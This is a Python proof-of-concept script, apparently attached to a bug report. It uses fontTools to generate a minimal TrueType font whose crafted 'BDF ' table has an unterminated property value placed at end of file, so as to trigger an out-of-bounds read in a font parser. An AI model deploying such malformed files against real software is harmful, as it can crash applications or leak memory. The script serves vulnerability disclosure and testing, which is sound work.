#!/usr/bin/env python3
"""Create an SFNT that triggers the embedded-BDF property over-read."""

import struct
import sys

from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen
from fontTools.ttLib import newTable


def main() -> int:
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} OUTPUT.ttf", file=sys.stderr)
        return 2

    output = sys.argv[1]

    # The property name is terminated, but its atom value is not.  The table
    # is 44 bytes (a multiple of four), allowing it to end exactly at EOF.
    strings = b"CHARSET_REGISTRY\0AAAAA"
    table_data = (
        struct.pack(">HHI", 1, 1, 22)       # version, strikes, strings offset
        + struct.pack(">HH", 16, 1)        # 16 ppem, one property
        + struct.pack(">IHI", 0, 0x11, 17) # name, atom type, value offsets
        + strings
    )
    assert len(table_data) == 44

    # Build a minimal synthetic TrueType face, avoiding any third-party font
    # data in the attachment.
    builder = FontBuilder(1024, isTTF=True)
    builder.setupGlyphOrder([".notdef"])
    builder.setupCharacterMap({})
    glyph = TTGlyphPen(None).glyph()
    builder.setupGlyf({".notdef": glyph})
    builder.setupHorizontalMetrics({".notdef": (600, 0)})
    builder.setupHorizontalHeader(ascent=824, descent=-200)
    builder.setupNameTable(
        {
            "familyName": "BDF Property PoC",
            "styleName": "Regular",
            "uniqueFontIdentifier": "BDFPropertyPoC-Regular",
            "fullName": "BDF Property PoC Regular",
            "psName": "BDFPropertyPoC-Regular",
            "version": "Version 1.0",
        }
    )
    builder.setupOS2(
        sTypoAscender=824,
        sTypoDescender=-200,
        usWinAscent=824,
        usWinDescent=200,
    )
    builder.setupPost()

    font = builder.font
    font.recalcTimestamp = False
    font["head"].created = 0
    font["head"].modified = 0
    table = newTable("BDF ")
    table.data = table_data
    font["BDF "] = table
    font.save(output, reorderTables=False)

    # Keep the BDF table at the exact physical end of the memory-face buffer.
    # This is only a sanity check; fontTools writes a checksum-consistent SFNT.
    with open(output, "rb") as stream:
        data = stream.read()
    num_tables = struct.unpack_from(">H", data, 4)[0]
    for index in range(num_tables):
        entry = 12 + index * 16
        if data[entry : entry + 4] == b"BDF ":
            offset, length = struct.unpack_from(">II", data, entry + 8)
            if data[offset : offset + length] != table_data:
                raise RuntimeError("unexpected BDF table contents")
            if offset + length != len(data):
                raise RuntimeError("BDF table is not the final SFNT table")
            break
    else:
        raise RuntimeError("BDF table missing")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
